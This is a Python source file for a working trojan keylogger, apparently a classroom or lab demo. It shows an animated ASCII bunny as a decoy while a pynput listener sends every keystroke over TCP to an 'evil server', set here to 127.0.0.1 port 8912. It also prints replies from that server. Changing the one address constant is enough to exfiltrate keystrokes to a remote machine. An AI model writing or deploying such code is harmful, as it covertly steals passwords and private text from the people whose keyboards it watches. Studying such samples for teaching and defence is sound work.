
from pynput import keyboard
import sys
import time
import socket
import threading

############################################################################

evilBunnyServerIP = "127.0.0.1"
evilBunnyServerPort = 8912
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

############################################################################


def start_new_thread(f, args):

    t = threading.Thread(target=f, args=args)
    t.start()
    return t


def main():

    global sock

    # Establish TCP socket with the distant server
    try:
        sock.connect((evilBunnyServerIP, evilBunnyServerPort))

    except Exception:

        print("Something wrong happened. Failed to connect to evil server? You should launch evilBunnyServer in another terminal first!")
        sys.exit(1)

    t1 = start_new_thread(animatedBunny, ())
    t2 = start_new_thread(keylog, ())
    t3 = start_new_thread(printMessagesFromEvilServer, ())

    # Send a hello message
    sock.send(b"Hello evil server !")

    # Infinite loop so that the program and thread keeps running
    while True:
        if any(not t.is_alive() for t in [t1, t2, t3]):
            sock = None
            sys.exit(0)


############################################################################

# Thread launched after connection with the evil server is started
# -> it launces the keylogger
def keylog():

    def on_press(key):

        if sock is None:
            sys.exit(0)

        try:
            sock.send(bytes(str(key).encode('utf-8')))
        except Exception as e:
            sys.exit(1)

    # Collect events until released
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

############################################################################


def printMessagesFromEvilServer():

    while True:
        if sock is None:
            sys.exit(0)

        data = sock.recv(1024).decode('utf-8')

        if not data:
            sys.exit(0)

        print("[Server] " + data)

############################################################################


bunny1 = r"""
           \`\ /`/
            \ V /
            /. .\
           =\ ~ /=
            / ^ \
           /\\ //\
         __\ " " /__
        (____/^\____)
        """


bunny2 = r"""
           \`\ /`/
            \ V /
            /. .\
           =\ v /=
            / ^ \
           /\\ //\
           \ " " /
           / / \ \
          / /   \ \
          `-     `-`
        """


def animatedBunny():

    while True:

        if sock is None:
            sys.exit(0)

        print("\n" * 80 + bunny1)

        time.sleep(1)

        print("\n" * 80 + bunny2)

        time.sleep(1)

############################################################################


main()
